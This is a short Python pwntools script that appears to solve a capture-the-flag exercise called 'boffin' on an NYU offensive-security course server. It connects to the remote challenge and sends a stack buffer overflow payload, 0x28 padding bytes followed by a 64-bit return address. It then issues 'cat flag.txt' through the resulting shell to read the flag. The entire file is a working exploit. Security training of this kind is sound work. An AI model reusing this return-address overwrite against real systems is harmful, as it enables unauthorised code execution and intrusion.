from pwn import *

#p = process('./boffin', raw=False)
#gdb.attach(p)

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)
p.recvuntil(':')
p.sendline("krm504")

p.recvuntil('?')

p.sendline('A'*0x28 + p64(0x40069d))

p.recvline()

p.sendline("cat flag.txt")

print(p.recvuntil('}'))

#p.interactive()